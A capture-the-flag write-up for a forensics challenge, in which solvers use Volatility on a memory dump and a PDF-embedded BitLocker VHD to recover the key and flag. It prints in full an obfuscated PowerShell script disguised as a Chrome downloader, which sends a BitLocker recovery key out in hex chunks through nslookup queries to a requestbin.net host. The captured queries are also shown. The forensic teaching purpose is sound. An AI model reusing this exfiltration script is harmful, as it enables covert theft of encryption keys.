---
title: "Trust Issues"
date: 2021-04-12T08:55:29+05:30
draft: false
toc: false
tags:
  - Forensics
  - volatility
  - Bitlocker encryption
  - Pragyan21
---


+ Solved by  [Rithvik](https://twitter.com/rith_vik_7)  and  [ABhishek Bharadwaj](https://twitter.com/MvpAbhishek)

![](https://i.imgur.com/AwkE6C2.png)

[Source](https://drive.google.com/file/d/1RCMrWHjw_UBLeYVcOnLcQvVT7hF3753A/view)

so we were basically given with a memorydump and pdf. 

### PDF Analysis

Since we got a pdf, We tried all type of stego tools and ended with binwalk

>binwalk -e confidential.pdf

![](https://i.imgur.com/7lDgK27.png)

We got a vhd - virtual hard disk from binwalk.. So let us analyse that.

Here we found header and replaced it with `head` and got the vhd. But it was **bitlocker** encrypted. 

So, We need to get either password or recovery key to unlock the vhd from bitlocker.

### Memory Analysis

As we were given with the memorydump we use basic use **VOLATILITY** for getting the active processes. 

First analysing the profile type using `imageinfo`, or `kdbgsearch`

>volatility -f trustissues.raw imageinfo

![](https://i.imgur.com/fD3oOcR.png)

Now we want to analyse the active proccess that are running, using pslist 

>volatility -f trustissues.raw --profile=Win7SP1x64 pslist

![](https://i.imgur.com/5tRlOCZ.png)
![](https://i.imgur.com/OVGxlZc.png)

Here, we can observe that Internet Explorer, Powershell and nslookups are active 

So, Let us look into Internet Explorer history using `iehistory` plugin

>volatility -f trustissues.raw --profile=Win7SP1x64 iehistory

![](https://i.imgur.com/trqEMOg.png)

So Let us find the file *ChromeDownload.ps1* that was accessed using Explorer

>volatility -f trustissues.raw --profile=Win7SP1x64 filescan | grep ChromeDownload.ps1

![](https://i.imgur.com/F8x0re4.png)

So, Let us dump this file using `dumpfiles` plugin

![](https://i.imgur.com/VW0Xqf9.png)

We got a **ps1** script which was powershell script similar to bash in Linux

```
 .("{0}{1}"-f 'ech','o'  ) 'Downloading Chrome......'

  & (  "{3}{4}{1}{0}{2}"-f 'eque','R','st','I','nvoke-Web' ) https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7B61A54C60-6972-227A-921D-DAD2B3C34001%7D%26lang%3Den%26browser%3D5%26usagestats%3D1%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26brand%3DONGR%26installdataindex%3Ddefaultbrowser/update2/installers/ChromeSetup.exe -OutFile ChromeSetup.exe

${D`UMp}    =     & ( "{1}{0}{2}"-f 't-','Forma','Hex') -Path 'D:\Bitlo*'
${d`NS}   =    '.7965708720dcbe1fbd5b.d.requestbin.net'

for( ${i}     =     0  ;    ${D`UmP}[${I}];    ${I}++ )
{
    ${h`eX}    =  ${d`UMp}[${i}].ToString(   )
    ${h`EX}   = ${H`Ex}.replace(  ' ','' )
    if( ${I} -lt (${du`MP}.length - 1) )
    {
         ${H`eX}   =   ${h`eX}.Substring(   8,32  )
    }
    else
    {
        ${l`En`GTH}  =     (   (  ${H`ex}.length - 8  )*2  )/3
        ${H`eX}   =   ${h`eX}.Substring(   8,${l`EngtH}  )
    }
      . (  "{1}{2}{0}" -f 'up','nslo','ok') ( ${H`eX}     + ${d`Ns}  ) *>${N`ULl}
}

.("{1}{0}"-f'cho','e'  ) 'Downloaded Chrome'
```

We can observe that the string *${d`NS}* was appending to a hex string and sending a request as lookup.. 

Since we can't dump nslookup let us try to dump powershell 

>volatility -f trustissues.raw --profile=Win7SP1x64 memdump -p 2556 -D ./

![](https://i.imgur.com/whNtEx9.png)

Now let us find for *${d`NS}*

>strings 2556.dmp | grep -i '.7965708720dcbe1fbd5b.d.requestbin.net' > abc.txt

We will endup with a text file with following contents

```
Name:    20006F006E0020006100200042006900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    410031002D0039004200450045002D00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    34004600310043002D00390030004600.7965708720dcbe1fbd5b.d.requestbin.net
Name:    37002D00350041004200360044003600.7965708720dcbe1fbd5b.d.requestbin.net
Name:    3600430044003400360035000D000A00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    0D000A004200690074004C006F006300.7965708720dcbe1fbd5b.d.requestbin.net
Name:    6B006500720020005200650063006F00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    760065007200790020004B0065007900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    3A000D000A0032003900390039003800.7965708720dcbe1fbd5b.d.requestbin.net
Name:    31002D00320039003700370039003200.7965708720dcbe1fbd5b.d.requestbin.net
Name:    2D003300360031003400370031002D00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    3200360031003700380039002D003100.7965708720dcbe1fbd5b.d.requestbin.net
Name:    310034003600340032002D0036003300.7965708720dcbe1fbd5b.d.requestbin.net
Name:    33003500300031002D00350032003000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    3600380035002D003400330033003700.7965708720dcbe1fbd5b.d.requestbin.net
Name:    310039000A000A000000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    6B0065007900200063006F006D007000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    61007200650020007400680065002000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    6900640065006E007400690066006900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    63006100740069006F006E0020007700.7965708720dcbe1fbd5b.d.requestbin.net
Name:    69007400680020007700680061007400.7965708720dcbe1fbd5b.d.requestbin.net
Name:    20006900730020007000720065007300.7965708720dcbe1fbd5b.d.requestbin.net
Name:    65006E0074006500640020006F006E00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    20007400680065002000720065006300.7965708720dcbe1fbd5b.d.requestbin.net
Name:    6F007600650072007900200073006300.7965708720dcbe1fbd5b.d.requestbin.net
Name:    7200650065006E002E000D000A000D00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    0A005200650063006F00760065007200.7965708720dcbe1fbd5b.d.requestbin.net
Name:    790020006B0065007900200069006400.7965708720dcbe1fbd5b.d.requestbin.net
Name:    65006E00740069006600690063006100.7965708720dcbe1fbd5b.d.requestbin.net
Name:    740069006F006E003A00200041004200.7965708720dcbe1fbd5b.d.requestbin.net
Name:    4300370043003700410031002D003900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    4200450045002D00340046000D000A00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    460075006C006C002000720065006300.7965708720dcbe1fbd5b.d.requestbin.net
Name:    6F00760065007200790020006B006500.7965708720dcbe1fbd5b.d.requestbin.net
Name:    790020006900640065006E0074006900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    6600690063006100740069006F006E00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    3A002000410042004300370043003700.7965708720dcbe1fbd5b.d.requestbin.net
Name:    FFFE4200690074004C006F0063006B00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    65007200200044007200690076006500.7965708720dcbe1fbd5b.d.requestbin.net
Name:    200045006E0063007200790070007400.7965708720dcbe1fbd5b.d.requestbin.net
Name:    69006F006E0020005200650063006F00.7965708720dcbe1fbd5b.d.requestbin.net
Name:    760065007200790020004B0065007900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    00000A000A0000005400680065002000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    7200650063006F007600650072007900.7965708720dcbe1fbd5b.d.requestbin.net
Name:    20006B00650079002000690073002000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    7500730065006400200074006F002000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    7200650063006F007600650072002000.7965708720dcbe1fbd5b.d.requestbin.net
Name:    74006800650020006400610074006100.7965708720dcbe1fbd5b.d.requestbin.net
```

Concatenating all the hex values before ${d\`NS} gives us

```
20006F006E0020006100200042006900410031002D0039004200450045002D0034004600310043002D0039003000460037002D003500410042003600440036003600430044003400360035000D000A000D000A004200690074004C006F0063006B006500720020005200650063006F00760065007200790020004B00650079003A000D000A003200390039003900380031002D003200390037003700390032002D003300360031003400370031002D003200360031003700380039002D003100310034003600340032002D003600330033003500300031002D003500320030003600380035002D003400330033003700310039000A000A0000006B0065007900200063006F006D007000610072006500200074006800650020006900640065006E00740069006600690063006100740069006F006E0020007700690074006800200077006800610074002000690073002000700072006500730065006E0074006500640020006F006E00200074006800650020007200650063006F0076006500720079002000730063007200650065006E002E000D000A000D000A005200650063006F00760065007200790020006B006500790020006900640065006E00740069006600690063006100740069006F006E003A002000410042004300370043003700410031002D0039004200450045002D00340046000D000A00460075006C006C0020007200650063006F00760065007200790020006B006500790020006900640065006E00740069006600690063006100740069006F006E003A002000410042004300370043003700FFFE4200690074004C006F0063006B0065007200200044007200690076006500200045006E006300720079007000740069006F006E0020005200650063006F00760065007200790020004B006500790000000A000A00000054006800650020007200650063006F00760065007200790020006B006500790020006900730020007500730065006400200074006F0020007200650063006F00760065007200200074006800650020006400610074006100
```

Decoding it from hex gives us recovery key for bitlocker

Recovery-key: `299981-297792-361471-261789-114642-633501-520685-433719`

Unlocking the vhd using recovery key gives us the flag 


**p_ctf{1_wi$h_y0u_DNSee_th3_kEy}**

References:
- [volatility command reference](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference)
- [Basics of Memory Forensics](https://stuxnet999.github.io/volatility/2020/08/18/Basics-of-Memory-Forensics.html)
- The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory (Wile05)



